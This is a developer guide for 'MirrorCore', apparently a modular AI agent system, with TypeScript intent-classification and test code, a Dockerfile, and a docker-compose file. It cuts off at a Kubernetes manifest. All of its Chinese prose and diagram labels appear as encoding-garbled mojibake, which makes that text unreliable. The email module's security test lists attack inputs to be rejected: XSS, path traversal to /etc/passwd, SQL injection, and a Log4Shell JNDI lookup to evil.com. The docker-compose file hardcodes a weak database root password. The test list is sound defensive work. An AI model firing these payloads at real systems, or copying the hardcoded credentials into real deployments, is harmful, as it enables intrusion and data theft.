# MirrorCore æ™ºèƒ½æ¨¡å—åŒ–AIä»£ç†ç³»ç»Ÿ - å¼€å‘æŒ‡å— ğŸ› ï¸

æœ¬æ–‡æ¡£ä¸ºMirrorCoreæ™ºèƒ½æ¨¡å—åŒ–AIä»£ç†ç³»ç»Ÿçš„å¼€å‘è€…æä¾›è¯¦ç»†çš„æ¶æ„è®¾è®¡è¯´æ˜ã€æ¨¡å—å¼€å‘è§„èŒƒå’Œæ‰©å±•å•†åº—ç”Ÿæ€å»ºè®¾æŒ‡å—ã€‚

## ğŸ“‹ ç›®å½•

- [ç³»ç»Ÿæ¶æ„æ¦‚è§ˆ](#-ç³»ç»Ÿæ¶æ„æ¦‚è§ˆ)
- [æ™ºèƒ½æ¨¡å—åŠ è½½æœºåˆ¶](#-æ™ºèƒ½æ¨¡å—åŠ è½½æœºåˆ¶)
- [æ‰©å±•å•†åº—æ¶æ„](#-æ‰©å±•å•†åº—æ¶æ„)
- [æ¨¡å—å¼€å‘æŒ‡å—](#-æ¨¡å—å¼€å‘æŒ‡å—)
- [AIæ„å›¾è¯†åˆ«ç³»ç»Ÿ](#-aiæ„å›¾è¯†åˆ«ç³»ç»Ÿ)
- [å¼€å‘ç¯å¢ƒé…ç½®](#-å¼€å‘ç¯å¢ƒé…ç½®)
- [æµ‹è¯•ä¸éƒ¨ç½²](#-æµ‹è¯•ä¸éƒ¨ç½²)
- [è´¡çŒ®æŒ‡å—](#-è´¡çŒ®æŒ‡å—)

---

## ğŸ—ï¸ ç³»ç»Ÿæ¶æ„æ¦‚è§ˆ

### æ™ºèƒ½æ¨¡å—åŒ–æ¶æ„

MirrorCoreé‡‡ç”¨é©å‘½æ€§çš„æ™ºèƒ½æ¨¡å—åŠ è½½æ¶æ„ï¼ŒAIæ ¹æ®ç”¨æˆ·å¯¹è¯å†…å®¹è‡ªåŠ¨åˆ¤æ–­å¹¶åŠ è½½æ‰€éœ€åŠŸèƒ½æ¨¡å—ï¼š

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ç”¨æˆ·äº¤äº’å±‚                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚
â”‚  â”‚  æ¡Œé¢åº”ç”¨   â”‚  â”‚   Webç•Œé¢   â”‚  â”‚  ç§»åŠ¨ç«¯APP  â”‚        â”‚
â”‚  â”‚ (Electron)  â”‚  â”‚  (React)    â”‚  â”‚ (React Native)â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  AIæ™ºèƒ½åˆ¤æ–­å¼•æ“                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚           æ„å›¾è¯†åˆ«ä¸æ¨¡å—æ¨èç³»ç»Ÿ                         â”‚ â”‚
â”‚  â”‚  â€¢ è‡ªç„¶è¯­è¨€ç†è§£  â€¢ æ„å›¾åˆ†ç±»  â€¢ æ¨¡å—åŒ¹é…  â€¢ æ™ºèƒ½æ¨è    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  æ‰©å±•å•†åº—ç®¡ç†å±‚                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚                  æ¨¡å—å•†åº—å¼•æ“                            â”‚ â”‚
â”‚  â”‚  â€¢ æ¨¡å—å‘ç°  â€¢ è‡ªåŠ¨ä¸‹è½½  â€¢ ç‰ˆæœ¬ç®¡ç†  â€¢ ä¾èµ–è§£æ        â”‚ â”‚
â”‚  â”‚  â€¢ å®‰å…¨æ£€æŸ¥  â€¢ æ€§èƒ½ç›‘æ§  â€¢ ç”¨æˆ·è¯„ä»·  â€¢ æ™ºèƒ½æ¨è        â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  åŠ¨æ€æ¨¡å—åŠ è½½å±‚                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚ğŸ“§ é‚®ä»¶   â”‚ â”‚ğŸ“… æ—¥ç¨‹   â”‚ â”‚ğŸƒâ€â™‚ï¸ å¥åº·  â”‚ â”‚ğŸ® å¨±ä¹   â”‚      â”‚
â”‚  â”‚  åŠ©æ‰‹    â”‚ â”‚  ç®¡ç†    â”‚ â”‚  ç®¡ç†    â”‚ â”‚  å†…å®¹    â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚ğŸ”§ å¼€å‘   â”‚ â”‚ğŸ’¼ åŠå…¬   â”‚ â”‚ğŸ  æ™ºèƒ½   â”‚ â”‚ğŸ“± ç”Ÿæ´»   â”‚      â”‚
â”‚  â”‚  åŠ©æ‰‹    â”‚ â”‚  æ•ˆç‡    â”‚ â”‚  å®¶å±…    â”‚ â”‚  åŠ©æ‰‹    â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  æ ¸å¿ƒæœåŠ¡å±‚                                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚ APIç½‘å…³  â”‚ â”‚ æ¶ˆæ¯é˜Ÿåˆ— â”‚ â”‚ æ•°æ®å­˜å‚¨ â”‚ â”‚ å®‰å…¨è®¤è¯ â”‚      â”‚
â”‚  â”‚  æœåŠ¡    â”‚ â”‚  æœåŠ¡    â”‚ â”‚  æœåŠ¡    â”‚ â”‚  æœåŠ¡    â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  AIæ¨ç†ä¸å­¦ä¹ å±‚                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚ GPT-4    â”‚ â”‚ Claude   â”‚ â”‚ Gemini   â”‚ â”‚ æœ¬åœ°æ¨¡å‹ â”‚      â”‚
â”‚  â”‚  é›†æˆ    â”‚ â”‚  é›†æˆ    â”‚ â”‚  é›†æˆ    â”‚ â”‚  æ”¯æŒ    â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### æ ¸å¿ƒè®¾è®¡ç†å¿µ

1. **æ™ºèƒ½æ„ŸçŸ¥**ï¼šAIè‡ªåŠ¨ç†è§£ç”¨æˆ·éœ€æ±‚ï¼Œæ— éœ€æ‰‹åŠ¨é€‰æ‹©åŠŸèƒ½
2. **æŒ‰éœ€åŠ è½½**ï¼šåªåŠ è½½å½“å‰ä»»åŠ¡æ‰€éœ€çš„æ¨¡å—ï¼ŒèŠ‚çœèµ„æº
3. **æ— ç¼é›†æˆ**ï¼šæ¨¡å—åŠ è½½è¿‡ç¨‹å¯¹ç”¨æˆ·é€æ˜ï¼Œæä¾›æµç•…ä½“éªŒ
4. **ç”Ÿæ€å¼€æ”¾**ï¼šæ”¯æŒç¬¬ä¸‰æ–¹å¼€å‘è€…è´¡çŒ®æ¨¡å—ï¼Œæ„å»ºä¸°å¯Œç”Ÿæ€

### æŠ€æœ¯æ ˆ

#### æ ¸å¿ƒæŠ€æœ¯æ ˆ
- **è¿è¡Œæ—¶**: Node.js 18+ / TypeScript 5+
- **AIæ¨ç†**: OpenAI GPT-4, Anthropic Claude, Google Gemini
- **æ¨¡å—ç³»ç»Ÿ**: åŠ¨æ€ESæ¨¡å—åŠ è½½, WebAssemblyæ”¯æŒ
- **æ¶ˆæ¯é˜Ÿåˆ—**: RabbitMQ, Apache Kafka (åˆ†å¸ƒå¼)
- **æ•°æ®å­˜å‚¨**: MongoDB (æ–‡æ¡£), Redis (ç¼“å­˜), Vector DB (å‘é‡æœç´¢)
- **å®¹å™¨åŒ–**: Docker, Kubernetes (ç”Ÿäº§ç¯å¢ƒ)

#### æ™ºèƒ½æ¨¡å—æŠ€æœ¯æ ˆ
- **æ„å›¾è¯†åˆ«**: è‡ªç„¶è¯­è¨€å¤„ç†, æœºå™¨å­¦ä¹ åˆ†ç±»å™¨
- **æ¨¡å—å‘ç°**: è¯­ä¹‰æœç´¢, ååŒè¿‡æ»¤æ¨è
- **å®‰å…¨æ²™ç®±**: V8 Isolates, WebAssemblyæ²™ç®±
- **æ€§èƒ½ç›‘æ§**: å®æ—¶æ€§èƒ½æŒ‡æ ‡, èµ„æºä½¿ç”¨è¿½è¸ª
- **ç‰ˆæœ¬ç®¡ç†**: è¯­ä¹‰åŒ–ç‰ˆæœ¬æ§åˆ¶, ä¾èµ–è§£æç®—æ³•

#### æ‰©å±•å•†åº—æŠ€æœ¯æ ˆ
- **å†…å®¹åˆ†å‘**: CDNå…¨çƒåŠ é€Ÿ, å¢é‡æ›´æ–°
- **å®‰å…¨æ‰«æ**: é™æ€ä»£ç åˆ†æ, æ¶æ„ä»£ç æ£€æµ‹
- **è´¨é‡è¯„ä¼°**: è‡ªåŠ¨åŒ–æµ‹è¯•, ä»£ç è´¨é‡æŒ‡æ ‡
- **ç”¨æˆ·åˆ†æ**: è¡Œä¸ºè¿½è¸ª, ä¸ªæ€§åŒ–æ¨è
- **æ”¯ä»˜ç³»ç»Ÿ**: å¤šç§æ”¯ä»˜æ–¹å¼, è®¢é˜…ç®¡ç†

#### å‰ç«¯æŠ€æœ¯æ ˆ
- **æ¡Œé¢åº”ç”¨**: Electron + React + TypeScript
- **Webåº”ç”¨**: React 18+ + TypeScript + Vite
- **ç§»åŠ¨åº”ç”¨**: React Native + TypeScript
- **çŠ¶æ€ç®¡ç†**: Zustand / Redux Toolkit
- **UIç»„ä»¶**: Ant Design / Material-UI
- **æ ·å¼æ–¹æ¡ˆ**: Tailwind CSS / Styled-components
- **æ„å»ºå·¥å…·**: Vite / Webpack 5

#### DevOpsæŠ€æœ¯æ ˆ
- **å®¹å™¨åŒ–**: Docker + Docker Compose
- **ç¼–æ’**: Kubernetes (ç”Ÿäº§ç¯å¢ƒ)
- **CI/CD**: GitHub Actions / GitLab CI
- **ç›‘æ§**: Prometheus + Grafana
- **æ—¥å¿—**: ELK Stack (Elasticsearch + Logstash + Kibana)
- **éƒ¨ç½²**: AWS / Azure / é˜¿é‡Œäº‘

---

## ğŸ¤– AIæ„å›¾è¯†åˆ«ç³»ç»Ÿ

### æ„å›¾åˆ†ç±»æ¶æ„

```typescript
// æ„å›¾åˆ†ç±»å™¨æ¥å£
interface IntentClassifier {
  classify(input: string, context: ConversationContext): Promise<ClassificationResult>;
  train(dataset: TrainingDataset): Promise<void>;
  evaluate(testSet: TestDataset): Promise<EvaluationMetrics>;
}

// åˆ†ç±»ç»“æœ
interface ClassificationResult {
  intent: IntentCategory;
  confidence: number;
  entities: ExtractedEntity[];
  moduleRecommendations: ModuleRecommendation[];
}

// æ„å›¾ç±»åˆ«
enum IntentCategory {
  EMAIL_MANAGEMENT = 'email_management',
  CONTENT_DISCOVERY = 'content_discovery', 
  HEALTH_TRACKING = 'health_tracking',
  SCHEDULE_MANAGEMENT = 'schedule_management',
  DEVELOPMENT_ASSISTANCE = 'development_assistance',
  SMART_HOME = 'smart_home',
  ENTERTAINMENT = 'entertainment',
  PRODUCTIVITY = 'productivity'
}
```

### å¤šå±‚æ„å›¾è¯†åˆ«

```typescript
class HierarchicalIntentClassifier implements IntentClassifier {
  private primaryClassifier: PrimaryIntentClassifier;
  private secondaryClassifiers: Map<IntentCategory, SecondaryIntentClassifier>;
  private entityExtractor: EntityExtractor;
  
  async classify(input: string, context: ConversationContext): Promise<ClassificationResult> {
    // ç¬¬ä¸€å±‚ï¼šä¸»è¦æ„å›¾åˆ†ç±»
    const primaryResult = await this.primaryClassifier.classify(input, context);
    
    // ç¬¬äºŒå±‚ï¼šç»†åˆ†æ„å›¾åˆ†ç±»
    const secondaryClassifier = this.secondaryClassifiers.get(primaryResult.intent);
    const secondaryResult = secondaryClassifier 
      ? await secondaryClassifier.classify(input, context)
      : null;
    
    // å®ä½“æå–
    const entities = await this.entityExtractor.extract(input, primaryResult.intent);
    
    // æ¨¡å—æ¨è
    const moduleRecommendations = await this.recommendModules(
      primaryResult, 
      secondaryResult, 
      entities, 
      context
    );
    
    return {
      intent: secondaryResult?.intent || primaryResult.intent,
      confidence: this.calculateCombinedConfidence(primaryResult, secondaryResult),
      entities,
      moduleRecommendations
    };
  }
  
  private async recommendModules(
    primary: ClassificationResult,
    secondary: ClassificationResult | null,
    entities: ExtractedEntity[],
    context: ConversationContext
  ): Promise<ModuleRecommendation[]> {
    const recommender = new ModuleRecommender();
    
    return await recommender.recommend({
      primaryIntent: primary.intent,
      secondaryIntent: secondary?.intent,
      entities,
      userHistory: context.userHistory,
      currentContext: context.currentContext
    });
  }
}
```

### å®ä½“æå–ç³»ç»Ÿ

```typescript
class EntityExtractor {
  private namedEntityRecognizer: NamedEntityRecognizer;
  private customEntityExtractors: Map<string, CustomEntityExtractor>;
  
  async extract(text: string, intent: IntentCategory): Promise<ExtractedEntity[]> {
    const entities: ExtractedEntity[] = [];
    
    // é€šç”¨å®ä½“è¯†åˆ«
    const namedEntities = await this.namedEntityRecognizer.recognize(text);
    entities.push(...namedEntities);
    
    // æ„å›¾ç‰¹å®šå®ä½“æå–
    const customExtractor = this.customEntityExtractors.get(intent);
    if (customExtractor) {
      const customEntities = await customExtractor.extract(text);
      entities.push(...customEntities);
    }
    
    // å®ä½“å…³ç³»åˆ†æ
    const relationships = await this.analyzeEntityRelationships(entities);
    
    return this.enrichEntitiesWithRelationships(entities, relationships);
  }
  
  private async analyzeEntityRelationships(entities: ExtractedEntity[]): Promise<EntityRelationship[]> {
    // ä½¿ç”¨å›¾ç¥ç»ç½‘ç»œåˆ†æå®ä½“é—´å…³ç³»
    const relationshipAnalyzer = new EntityRelationshipAnalyzer();
    return await relationshipAnalyzer.analyze(entities);
  }
}
```

### ä¸Šä¸‹æ–‡æ„ŸçŸ¥æ¨ç†

```typescript
class ContextAwareReasoner {
  private conversationMemory: ConversationMemory;
  private userProfiler: UserProfiler;
  private situationalAnalyzer: SituationalAnalyzer;
  
  async enhanceClassification(
    baseResult: ClassificationResult,
    context: ConversationContext
  ): Promise<EnhancedClassificationResult> {
    // å¯¹è¯å†å²åˆ†æ
    const conversationInsights = await this.conversationMemory.analyze(context.history);
    
    // ç”¨æˆ·ç”»åƒåˆ†æ
    const userProfile = await this.userProfiler.getProfile(context.userId);
    
    // æƒ…å¢ƒåˆ†æ
    const situationalContext = await this.situationalAnalyzer.analyze({
      timeOfDay: new Date().getHours(),
      dayOfWeek: new Date().getDay(),
      userLocation: context.location,
      deviceType: context.deviceType
    });
    
    // ç»¼åˆæ¨ç†
    const enhancedResult = await this.performContextualReasoning({
      baseResult,
      conversationInsights,
      userProfile,
      situationalContext
    });
    
    return enhancedResult;
  }
  
  private async performContextualReasoning(input: ReasoningInput): Promise<EnhancedClassificationResult> {
    // ä½¿ç”¨å¤§è¯­è¨€æ¨¡å‹è¿›è¡Œä¸Šä¸‹æ–‡æ¨ç†
    const reasoningPrompt = this.buildReasoningPrompt(input);
    const reasoningResult = await this.llmService.reason(reasoningPrompt);
    
    return this.parseReasoningResult(reasoningResult, input.baseResult);
  }
}
```

---

## ğŸ§ª æµ‹è¯•ä¸éƒ¨ç½²

### æµ‹è¯•ç­–ç•¥

#### 1. æ¨¡å—æµ‹è¯•æ¡†æ¶

```typescript
// æ¨¡å—æµ‹è¯•åŸºç±»
abstract class ModuleTestSuite {
  protected module: Module;
  protected testEnvironment: TestEnvironment;
  
  async setup(): Promise<void> {
    this.testEnvironment = await this.createTestEnvironment();
    this.module = await this.loadModule();
    await this.module.initialize(this.getTestConfig());
  }
  
  async teardown(): Promise<void> {
    await this.module.cleanup();
    await this.testEnvironment.cleanup();
  }
  
  // åŠŸèƒ½æµ‹è¯•
  abstract testCapabilities(): Promise<void>;
  
  // æ€§èƒ½æµ‹è¯•
  abstract testPerformance(): Promise<void>;
  
  // å®‰å…¨æµ‹è¯•
  abstract testSecurity(): Promise<void>;
  
  // å…¼å®¹æ€§æµ‹è¯•
  abstract testCompatibility(): Promise<void>;
}

// é‚®ä»¶æ¨¡å—æµ‹è¯•ç¤ºä¾‹
class EmailModuleTestSuite extends ModuleTestSuite {
  async testCapabilities(): Promise<void> {
    // æµ‹è¯•é‚®ä»¶å‘é€åŠŸèƒ½
    const result = await this.module.execute({
      capability: 'compose-email',
      parameters: {
        recipient: 'test@example.com',
        subject: 'Test Email',
        content: 'This is a test email'
      },
      context: this.createTestContext()
    });
    
    expect(result.success).toBe(true);
    expect(result.messageId).toBeDefined();
  }
  
  async testPerformance(): Promise<void> {
    const startTime = Date.now();
    
    // æ‰¹é‡å‘é€æµ‹è¯•
    const promises = Array.from({ length: 100 }, (_, i) => 
      this.module.execute({
        capability: 'compose-email',
        parameters: {
          recipient: `test${i}@example.com`,
          subject: `Test Email ${i}`,
          content: `This is test email number ${i}`
        },
        context: this.createTestContext()
      })
    );
    
    await Promise.all(promises);
    
    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(30000); // 30ç§’å†…å®Œæˆ
  }
  
  async testSecurity(): Promise<void> {
    // æµ‹è¯•æ¶æ„è¾“å…¥å¤„ç†
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      'DROP TABLE users;',
      '${jndi:ldap://evil.com/a}'
    ];
    
    for (const input of maliciousInputs) {
      const result = await this.module.execute({
        capability: 'compose-email',
        parameters: {
          recipient: input,
          subject: input,
          content: input
        },
        context: this.createTestContext()
      });
      
      // åº”è¯¥å®‰å…¨åœ°å¤„ç†æ¶æ„è¾“å…¥
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid input');
    }
  }
}
```

#### 2. é›†æˆæµ‹è¯•

```typescript
class IntegrationTestSuite {
  private testSystem: TestSystem;
  
  async testModuleInteraction(): Promise<void> {
    // æµ‹è¯•æ¨¡å—é—´åä½œ
    const emailModule = await this.testSystem.loadModule('email-assistant');
    const scheduleModule = await this.testSystem.loadModule('schedule-management');
    
    // åˆ›å»ºå¸¦æé†’çš„é‚®ä»¶ä»»åŠ¡
    const scheduleResult = await scheduleModule.execute({
      capability: 'create-reminder',
      parameters: {
        title: 'Send weekly report',
        time: '2024-01-15T09:00:00Z',
        action: {
          type: 'email',
          parameters: {
            recipient: 'boss@company.com',
            subject: 'Weekly Report',
            template: 'weekly-report'
          }
        }
      },
      context: this.createTestContext()
    });
    
    expect(scheduleResult.success).toBe(true);
    
    // æ¨¡æ‹Ÿæ—¶é—´åˆ°è¾¾ï¼Œæ£€æŸ¥é‚®ä»¶æ˜¯å¦å‘é€
    await this.testSystem.advanceTime('2024-01-15T09:00:00Z');
    
    const emailLogs = await this.testSystem.getModuleLogs('email-assistant');
    expect(emailLogs).toContainEqual(
      expect.objectContaining({
        action: 'email-sent',
        recipient: 'boss@company.com'
      })
    );
  }
  
  async testAIIntentRecognition(): Promise<void> {
    const testCases = [
      {
        input: 'ç»™å¼ ä¸‰å‘é‚®ä»¶è¯´æ˜å¤©å¼€ä¼š',
        expectedIntent: 'email_management',
        expectedModules: ['email-assistant'],
        expectedEntities: [
          { type: 'person', value: 'å¼ ä¸‰' },
          { type: 'action', value: 'å‘é‚®ä»¶' },
          { type: 'time', value: 'æ˜å¤©' },
          { type: 'event', value: 'å¼€ä¼š' }
        ]
      },
      {
        input: 'æœç´¢æ˜æ—¥æ–¹èˆŸæ–°æ´»åŠ¨æ”»ç•¥',
        expectedIntent: 'content_discovery',
        expectedModules: ['content-discovery'],
        expectedEntities: [
          { type: 'game', value: 'æ˜æ—¥æ–¹èˆŸ' },
          { type: 'content_type', value: 'æ”»ç•¥' },
          { type: 'time', value: 'æ–°æ´»åŠ¨' }
        ]
      }
    ];
    
    for (const testCase of testCases) {
      const result = await this.testSystem.processUserInput(testCase.input);
      
      expect(result.intent).toBe(testCase.expectedIntent);
      expect(result.recommendedModules).toEqual(
        expect.arrayContaining(testCase.expectedModules)
      );
      expect(result.entities).toEqual(
        expect.arrayContaining(testCase.expectedEntities)
      );
    }
  }
}
```

#### 3. æ€§èƒ½æµ‹è¯•

```typescript
class PerformanceTestSuite {
  async testModuleLoadingPerformance(): Promise<void> {
    const loadingTimes: number[] = [];
    
    // æµ‹è¯•æ¨¡å—åŠ è½½æ—¶é—´
    for (let i = 0; i < 50; i++) {
      const startTime = performance.now();
      
      const module = await this.testSystem.loadModule('email-assistant');
      await module.initialize(this.getTestConfig());
      
      const endTime = performance.now();
      loadingTimes.push(endTime - startTime);
      
      await module.cleanup();
    }
    
    const averageLoadTime = loadingTimes.reduce((a, b) => a + b) / loadingTimes.length;
    const maxLoadTime = Math.max(...loadingTimes);
    
    expect(averageLoadTime).toBeLessThan(1000); // å¹³å‡1ç§’å†…
    expect(maxLoadTime).toBeLessThan(3000); // æœ€å¤§3ç§’å†…
  }
  
  async testConcurrentModuleExecution(): Promise<void> {
    const concurrentTasks = 100;
    const startTime = performance.now();
    
    const promises = Array.from({ length: concurrentTasks }, async (_, i) => {
      const module = await this.testSystem.loadModule('email-assistant');
      return await module.execute({
        capability: 'compose-email',
        parameters: {
          recipient: `test${i}@example.com`,
          subject: `Concurrent Test ${i}`,
          content: `This is concurrent test number ${i}`
        },
        context: this.createTestContext()
      });
    });
    
    const results = await Promise.all(promises);
    const endTime = performance.now();
    
    const successCount = results.filter(r => r.success).length;
    const totalTime = endTime - startTime;
    
    expect(successCount).toBe(concurrentTasks);
    expect(totalTime).toBeLessThan(10000); // 10ç§’å†…å®Œæˆ
  }
}
```

### éƒ¨ç½²æµç¨‹

#### 1. å®¹å™¨åŒ–éƒ¨ç½²

```dockerfile
# Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

FROM node:18-alpine AS runtime

# å®‰å…¨é…ç½®
RUN addgroup -g 1001 -S nodejs
RUN adduser -S mirrorcore -u 1001

WORKDIR /app

# å¤åˆ¶æ„å»ºäº§ç‰©
COPY --from=builder --chown=mirrorcore:nodejs /app/dist ./dist
COPY --from=builder --chown=mirrorcore:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=mirrorcore:nodejs /app/package.json ./package.json

# åˆ›å»ºæ•°æ®ç›®å½•
RUN mkdir -p /app/data && chown mirrorcore:nodejs /app/data

USER mirrorcore

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node dist/healthcheck.js

CMD ["node", "dist/server.js"]
```

```yaml
# docker-compose.yml
version: '3.8'

services:
  mirrorcore-api:
    build: .
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - REDIS_URL=redis://redis:6379
      - MONGODB_URL=mongodb://mongodb:27017/mirrorcore
    depends_on:
      - redis
      - mongodb
    volumes:
      - ./data:/app/data
    restart: unless-stopped
    
  redis:
    image: redis:7-alpine
    volumes:
      - redis_data:/data
    restart: unless-stopped
    
  mongodb:
    image: mongo:6
    volumes:
      - mongodb_data:/data/db
    environment:
      - MONGO_INITDB_ROOT_USERNAME=admin
      - MONGO_INITDB_ROOT_PASSWORD=password
    restart: unless-stopped
    
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./ssl:/etc/nginx/ssl
    depends_on:
      - mirrorcore-api
    restart: unless-stopped

volumes:
  redis_data:
  mongodb_data:
```

#### 2. Kuberneteséƒ¨ç½²

```yaml
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
